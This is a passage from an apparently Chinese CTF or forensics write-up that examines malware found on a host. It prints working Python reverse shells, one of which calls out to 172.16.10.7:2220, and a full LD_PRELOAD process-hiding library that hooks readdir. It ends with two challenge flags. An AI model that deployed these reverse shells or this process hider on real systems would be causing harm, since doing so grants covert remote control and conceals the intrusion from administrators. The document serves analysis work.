&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dup2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sdregs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fileno&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dup2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sdregs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fileno&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dup2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sdregs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fileno&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">subprocess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">call&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;/bin/bash&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;-i&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sdregs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>是一个进行提权的脚本，里面有个&lt;code>processhider.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;span class="lnt">82
&lt;/span>&lt;span class="lnt">83
&lt;/span>&lt;span class="lnt">84
&lt;/span>&lt;span class="lnt">85
&lt;/span>&lt;span class="lnt">86
&lt;/span>&lt;span class="lnt">87
&lt;/span>&lt;span class="lnt">88
&lt;/span>&lt;span class="lnt">89
&lt;/span>&lt;span class="lnt">90
&lt;/span>&lt;span class="lnt">91
&lt;/span>&lt;span class="lnt">92
&lt;/span>&lt;span class="lnt">93
&lt;/span>&lt;span class="lnt">94
&lt;/span>&lt;span class="lnt">95
&lt;/span>&lt;span class="lnt">96
&lt;/span>&lt;span class="lnt">97
&lt;/span>&lt;span class="lnt">98
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;dlfcn.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;dirent.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Every process with this name will be excluded
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">process_to_filter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;1.py&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Get a directory name given a DIR* handle
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">get_dir_name&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DIR&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">dirp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">dirfd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dirp&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">tmp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">snprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;/proc/self/fd/%d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">readlink&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Get a process name given its pid
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">get_process_name&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">strspn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;0123456789&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">tmp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">snprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;/proc/%s/stat&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">f&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">unused&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sscanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%d (%[^)]s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">unused&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define DECLARE_READDIR(dirent, readdir) \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">static struct dirent* (*original_##readdir)(DIR*) = NULL; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">struct dirent* readdir(DIR *dirp) \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">{ \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> if(original_##readdir == NULL) { \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> original_##readdir = dlsym(RTLD_NEXT, #readdir); \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> if(original_##readdir == NULL) \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> { \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> fprintf(stderr, &amp;#34;Error in dlsym: %s\n&amp;#34;, dlerror()); \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> } \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> } \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> struct dirent* dir; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> while(1) \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> { \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> dir = original_##readdir(dirp); \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> if(dir) { \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> char dir_name[256]; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> char process_name[256]; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;amp;&amp;amp; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> strcmp(dir_name, &amp;#34;/proc&amp;#34;) == 0 &amp;amp;&amp;amp; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> get_process_name(dir-&amp;gt;d_name, process_name) &amp;amp;&amp;amp; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> strcmp(process_name, process_to_filter) == 0) { \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> continue; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> } \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> } \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> break; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> } \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> return dir; \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">}
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">DECLARE_READDIR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dirent64&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">readdir64&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">DECLARE_READDIR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dirent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">readdir&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>shell.py&lt;/code>也是反弹shell的，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">os&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">dup2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">subprocess&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">run&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">AF_INET&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SOCK_STREAM&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">connect&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="s2">&amp;#34;172.16.10.7&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2220&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dup2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fileno&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dup2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fileno&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dup2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fileno&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">run&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;/bin/bash&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;-i&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{109ccb5768c70638e24fb46ee7957e37}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag{114.114.114.121:9999}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f3">f3
